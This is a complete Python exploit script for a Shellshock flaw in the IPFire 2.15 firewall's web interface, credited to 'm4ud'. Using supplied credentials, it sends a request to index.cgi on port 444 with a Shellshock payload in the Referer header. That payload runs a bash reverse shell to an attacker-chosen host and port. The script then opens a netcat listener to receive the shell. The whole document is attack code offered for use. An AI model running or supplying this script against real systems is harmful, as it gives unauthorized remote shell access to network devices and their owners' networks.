#!/usr/bin/python3
# Exploit Title: IPFire 2.15 ShellShock
# Exploit Author: (m4ud)

import requests
import base64
import sys
from urllib3.exceptions import InsecureRequestWarning
from optparse import OptionParser
import subprocess

class burn(): 
  def __init__(self, options): 
    self.target = options.target 
    self.user = options.user
    self.pwd = options.pwd
    self.lhost = options.lhost  
    self.lport = options.lport  

    print("\r\n[+] (m4ud) ShellShock IPFire to Shell! [+]\r\n")
    shell = "sleep 2;bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
    auth = self.user + ":" + self.pwd

    auth = base64.b64encode(bytes(auth, encoding='utf-8')).decode('utf-8')
    auth = "Basic " + auth

    ShellShock = "() { :;}; /bin/bash -c " + '"' + shell + '"'
    headers = { "Authorization": auth, "Referer": ShellShock }

    url = "https://" + self.target + ":444/cgi-bin/index.cgi"
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    print("[+] Throwing a water bucket in IPFire!  [+]")
    print("[*] Get Shell, check your netcat listener! [*]")
    f = subprocess.Popen(["nc", "-lvnp", self.lport])
    r = requests.get(url, headers=headers, verify=False, timeout=(1, 0.0000000001))
    f.communicate()
def main():
  parser = OptionParser()  
    
  parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")  
  parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT")  
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST")  
  parser.add_option("-u", dest="user",default=443, help="Username")
  parser.add_option("-P", dest="pwd", help="PWD") 
  (options, args) = parser.parse_args()  
  if options.target:  
    exploit = burn(options)
  else: 
    parser.print_help()

if __name__=="__main__":
    main()

